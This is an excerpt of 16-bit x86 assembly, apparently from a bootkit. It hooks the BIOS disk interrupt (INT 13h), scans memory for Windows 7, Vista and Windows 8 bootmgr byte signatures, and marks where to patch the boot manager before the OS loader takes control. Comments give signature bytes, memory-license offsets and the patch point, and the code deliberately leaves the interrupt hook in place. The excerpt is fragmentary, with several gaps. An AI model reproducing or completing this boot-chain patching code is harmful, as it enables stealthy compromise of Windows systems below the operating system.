...
;NON Standard Sector Main program
...
;Global offsets:
BmMainOffset dd 0a8ch                   ; NOT NEEDED ANYMORE: offset jump to bootmgr BmMain

; Windows 7 Signatures
bootmgr_firstbyte db 0EEh               ; OUT DX,AL Opcode
bootmgr_secondbyte db 0C3h              ; RETN Opcode
bootmgr_signature dd 0B8665066h         ; NOT NEEDED ANYMORE: last four bytes of bootmgr
; Windows Seven SP1 MxMemoryLicense: 0x03A6BA2 - Vista SP2: 0x035444C
Memory_License_Start dd 0340000h
; Windows 8 MxMemoryLicense: 0x05153c0
...
L1:
    ...
    mov ah, byte [cs:bootmgr_secondbyte]
...
Int13Hook_scan_loop:
    ...
    ; EB xx           jmp +XX
    ; ...
    ; BA F2 03        mov dx, 3f2h
    ; B8 0C 00        mov ax, 0ch
    ; EE              out dx, al
    ; C3              retn
    ; bootmgr!main + BmMainOffset (0x0a8c)
    ; c800 0000       enter   0,0
    ; 668b5e04        mov     bx,word ptr [bp+4]
    ; 668b5608        mov     dx,word ptr [bp+8]
    ; 6633c9          xor     ecx,ecx
    ; 8b0e3615        mov     cx,ds:word_1536
    ; 66c1e104        shl     ecx, 4
    ; 668be9          mov     ebp,ecx
    ; 6633c9          xor     ecx,ecx
    ; b99a0a          mov     cx,0A9Ah
    ...
    ; 8ed9            mov     ds,cx
    ; 8ec1            mov     es,cx
    ; 66bcfc1f0600    mov     esp,61FFCh
    ; 6652            push edx       <- Apply patch here
    ; 6655            push ebp
    ; 6633ed          xor ebp, ebp
    ; 66 6a20         push 20h
    ; 6653            push ebx       <- What does EBX contains? 0x40100, OSLOADER.EXE Entry point
    ; 66cb            retf

    repne scasb
    jcxz Int13Hook_scan_done
    cmp byte [es:di], ah     ; DL = Bootmgr Second Byte (retn)
    jne Int13Hook_scan_loop
    cmp dword [es:di + 1], 0c8h     ; enter 0, 0
    jne Int13Hook_scan_loop

    ; Now start second search
    mov dx, cx
    cmp dx, 080h
    jb $+5
    mov dx, 080h
...
Bootmgr_16bit_scan_loop:
    dec dx
    cmp dx, 0
    je Int13Hook_scan_loop

    inc di
    cmp dword [es:di], 055665266h
    jnz Bootmgr_16bit_scan_loop

    cmp dword [es:di + 4], 066ed3366h
    jnz Bootmgr_16bit_scan_loop

    cmp dword [es:di + 8], 05366206Ah
    jnz Bootmgr_16bit_scan_loop
...
signature_found:
    ...
    ; DON'T Restore old INT13 routine
;    push    ebx
;    push    es
;    xor     bx, bx
;    mov     es, bx
